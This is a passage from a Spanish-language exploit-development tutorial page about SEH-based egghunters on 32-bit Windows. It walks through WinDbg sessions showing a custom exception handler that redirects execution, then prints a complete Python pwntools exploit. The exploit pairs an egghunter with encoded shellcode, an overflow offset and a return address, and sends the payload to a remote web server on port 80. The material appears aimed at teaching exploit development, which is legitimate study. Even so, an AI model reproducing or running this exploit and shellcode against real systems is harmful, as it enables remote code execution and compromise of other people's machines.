</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=0454eabf edx=77128ac0 esi=00000000 edi=00000000  
eip=0454eabf esp=0454e468 ebp=0454e488 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0454eabf 6a0c            push    0Ch</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro codigo inicia almacenando <code class="language-plaintext highlighter-rouge">0xc</code> en <code class="language-plaintext highlighter-rouge">ecx</code> que usa como offset con el registro <code class="language-plaintext highlighter-rouge">esp</code> para buscar el argumento en <code class="language-plaintext highlighter-rouge">eax</code> con el puntero a la estructura <code class="language-plaintext highlighter-rouge">CONTEXT</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=0454eabf edx=77128ac0 esi=00000000 edi=00000000
eip=0454eabf esp=0454e468 ebp=0454e488 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0454eabf 6a0c            push    0Ch

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=00000000 ecx=0454eabf edx=77128ac0 esi=00000000 edi=00000000
eip=0454eac1 esp=0454e464 ebp=0454e488 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0454eac1 59              pop     ecx

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=00000000 ecx=0000000c edx=77128ac0 esi=00000000 edi=00000000
eip=0454eac2 esp=0454e468 ebp=0454e488 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0454eac2 8b040c          mov     eax,dword ptr [esp+ecx] ss:002b:0454e474=0454e5bc  </span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que el valor <code class="language-plaintext highlighter-rouge">eip</code> en la estructura <code class="language-plaintext highlighter-rouge">CONTEXT</code> apunta a la instruccion que causó la excepción (<code class="language-plaintext highlighter-rouge">repz scasd</code>), al restaurar el flujo de la ejecución nos gustaría que apuntara a <code class="language-plaintext highlighter-rouge">.page</code> que ejecuta <code class="language-plaintext highlighter-rouge">or bx, 0xfff</code> que esta <code class="language-plaintext highlighter-rouge">0x6</code> bytes después</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=0454e5bc ebx=00000000 ecx=0000000c edx=77128ac0 esi=00000000 edi=00000000  
eip=0454eac5 esp=0454e468 ebp=0454e488 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0454eac5 b1b8            mov     cl,0B8h

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_CONTEXT @eax
   +0x000 ContextFlags     : 0x1007f
   +0x004 Dr0              : 0
   +0x008 Dr1              : 0
   +0x00c Dr2              : 0
   +0x010 Dr3              : 0
   +0x014 Dr6              : 0
   +0x018 Dr7              : 0
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : 0x2b
   +0x090 SegFs            : 0x53
   +0x094 SegEs            : 0x2b
   +0x098 SegDs            : 0x2b
   +0x09c Edi              : 4
   +0x0a0 Esi              : 0x2262ca0
   +0x0a4 Ebx              : 4
   +0x0a8 Edx              : 0x454e508
   +0x0ac Ecx              : 2
   +0x0b0 Eax              : 0x74303077
   +0x0b4 Ebp              : 0x41414141
   +0x0b8 Eip              : 0x454eaac
   +0x0bc SegCs            : 0x23
   +0x0c0 EFlags           : 0x10202
   +0x0c4 Esp              : 0x454ea1c
   +0x0c8 SegSs            : 0x2b
   +0x0cc ExtendedRegisters : [512]  "???"

</span><span class="ro">0:000> </span><span class="p">u 0x454eaac
0454eaac f3af            repe scas dword ptr es:[edi]
0454eaae 7507            jne     0454eab7
0454eab0 ffe7            jmp     edi
0454eab2 6681cbff0f      or      bx,0FFFh
0454eab7 43              inc     ebx
0454eab8 ebed            jmp     0454eaa7
0454eaba e8d1ffffff      call    0454ea90
0454eabf 6a0c            push    0Ch

</span><span class="ro">0:000> </span><span class="p">? 0x0454eab2 - 0x0454eaac
Evaluate expression: 6 = 00000006</span>
</code></pre></div></div><br>

<p class="plain-text">Resumiendo, cada que <code class="language-plaintext highlighter-rouge">repz scasd</code> causa una excepción nuestro controlador personalizado lleva el flujo a <code class="language-plaintext highlighter-rouge">.page</code> que aumenta la página hasta que esta sea valida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=0454e5bc ebx=00000000 ecx=000000b8 edx=77128ac0 esi=00000000 edi=00000000
eip=0454eac7 esp=0454e468 ebp=0454e488 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0454eac7 83040806        add     dword ptr [eax+ecx],6 ds:002b:0454e674=0454eaac  

</span><span class="ro">0:000> </span><span class="p">p
eax=0454e5bc ebx=00000000 ecx=000000b8 edx=77128ac0 esi=00000000 edi=00000000
eip=0454eacb esp=0454e468 ebp=0454e488 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
0454eacb 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">dt ntdll!_CONTEXT @eax
   +0x000 ContextFlags     : 0x1007f
   +0x004 Dr0              : 0
   +0x008 Dr1              : 0
   +0x00c Dr2              : 0
   +0x010 Dr3              : 0
   +0x014 Dr6              : 0
   +0x018 Dr7              : 0
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : 0x2b
   +0x090 SegFs            : 0x53
   +0x094 SegEs            : 0x2b
   +0x098 SegDs            : 0x2b
   +0x09c Edi              : 4
   +0x0a0 Esi              : 0x2262ca0
   +0x0a4 Ebx              : 4
   +0x0a8 Edx              : 0x454e508
   +0x0ac Ecx              : 2
   +0x0b0 Eax              : 0x74303077
   +0x0b4 Ebp              : 0x41414141
   +0x0b8 Eip              : 0x454eab2
   +0x0bc SegCs            : 0x23
   +0x0c0 EFlags           : 0x10202
   +0x0c4 Esp              : 0x454ea1c
   +0x0c8 SegSs            : 0x2b
   +0x0cc ExtendedRegisters : [512]  "???"

</span><span class="ro">0:000> </span><span class="p">u 0x454eab2
0454eab2 6681cbff0f      or      bx,0FFFh
0454eab7 43              inc     ebx
0454eab8 ebed            jmp     0454eaa7
0454eaba e8d1ffffff      call    0454ea90
0454eabf 6a0c            push    0Ch
0454eac1 59              pop     ecx
0454eac2 8b040c          mov     eax,dword ptr [esp+ecx]
0454eac5 b1b8            mov     cl,0B8h</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que entendimos como funcione el egghunter podemos <code class="language-plaintext highlighter-rouge">deshabilitar</code> las excepciones y establecer un <code class="language-plaintext highlighter-rouge">breakpoint</code> en el <code class="language-plaintext highlighter-rouge">jmp edi</code>, al dejar que el programa corra llegamos al breakpoint que indica que en <code class="language-plaintext highlighter-rouge">edi</code> se encuentra nuestro shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">sxd av

</span><span class="ro">0:000> </span><span class="p">sxd gp

</span><span class="ro">0:000> </span><span class="p">bc *

</span><span class="ro">0:000> </span><span class="p">bp 0x0454eab0

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=74303077 ebx=04a58183 ecx=00000000 edx=0454e508 esi=02262ca0 edi=04a5818b  
eip=0454eab0 esp=0454ea1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0454eab0 ffe7            jmp     edi {04a5818b}

</span><span class="ro">0:000> </span><span class="p">u edi
04a5818b 43              inc     ebx
04a5818c 43              inc     ebx
04a5818d 43              inc     ebx
04a5818e 43              inc     ebx
04a5818f 43              inc     ebx
04a58190 43              inc     ebx
04a58191 43              inc     ebx
04a58192 43              inc     ebx</span>
</code></pre></div></div><br>

<p class="plain-text">Al exploit anterior solo le cambiamos el <code class="language-plaintext highlighter-rouge">egghunter</code> y ahora al ejecutarlo deberia de funcionar correctamente casi en cualquier sistema ya que no depende de la <code class="language-plaintext highlighter-rouge">syscall</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xeb\x2a\xb8\x77\x30\x30\x74\x59\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3</span><span class="s">"  

</span><span class="p">shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\xc2\x02\xd8\xe2\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x3e\xea\x5a\xe2\xbe\xeb\x3a\x6a</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5b\xda\x7a\x08\x28\x4d\x4b\x5a\x7c\x62\x20</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x94\xf1\x44\x87\x9b\xb2\xe3\xf1\x92\x43</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5f\xc1\xb5\xc7\xa2\x16\x15\xf9\x6c\x6b\x54</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3e\x90\x86\x04\x97\xde\x35\xb8\x9c\xab\x85</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\xee\x3a\x8e\xa0\xa7\x3d\xbf\x77\xb3\x67</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1f\x76\x10\x1c\x16\x60\x75\x19\xe0\x1b\x4d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd5\xf3\xcd\x9f\x16\x5f\x30\x10\xe5\xa1\x75</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x97\x16\xd4\x8f\xeb\xab\xef\x54\x91\x77\x65</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4e\x31\xf3\xdd\xaa\xc3\xd0\xb8\x39\xcf\x9d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcf\x65\xcc\x20\x03\x1e\xe8\xa9\xa2\xf0\x78</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe9\x80\xd4\x21\xa9\xa9\x4d\x8c\x1c\xd5\x8d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6f\xc0\x73\xc6\x82\x15\x0e\x85\xc8\xe8\x9c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb0\xbf\xeb\x9e\xba\xef\x83\xaf\x31\x60\xd3</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x90\xc4\x2b\x7a\xb8\x6d\xa4\x23\x29\x2c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa9\xd3\x84\x73\xd4\x57\x2c\x0c\x23\x47\x45</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x09\x6f\xcf\xb6\x63\xe0\xba\xb8\xd0\x01\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdb\xb7\x91\x73\x35\x5d\x12\x11\x49\x9d\xe2</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd9\x49\x9d\xe2\xd9</span><span class="s">"</span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<a href="/exploitdevelopment/user-mode/egghunters/10.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/10.png"></p></div></a>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
